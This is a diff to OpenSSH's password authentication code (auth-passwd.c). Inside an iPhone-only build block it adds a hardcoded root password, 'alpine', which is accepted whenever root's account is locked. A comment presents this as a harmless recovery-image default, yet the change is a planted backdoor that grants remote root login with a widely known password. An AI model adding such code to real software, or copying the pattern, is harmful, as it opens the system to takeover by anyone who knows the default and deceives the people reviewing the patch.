--- a/auth-passwd.c
+++ b/auth-passwd.c
@@ -201,6 +201,17 @@
 	if (pw_password == NULL)
 		return 0;
 
+#if defined(TARGET_OS_IPHONE) && TARGET_OS_IPHONE
+	/* The recovery image has no writable system password database. Give
+	 * root an initial password when its system account is locked. A real
+	 * password hash, if configured later, takes precedence. */
+	if (authctxt->valid && pw->pw_uid == 0 &&
+	    (pw_password[0] == '*' || pw_password[0] == '!') &&
+	    strlen(password) == sizeof("alpine") - 1 &&
+	    timingsafe_bcmp(password, "alpine", sizeof("alpine") - 1) == 0)
+		return 1;
+#endif
+
 	/* Check for users with no password. */
 	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
 		return (1);
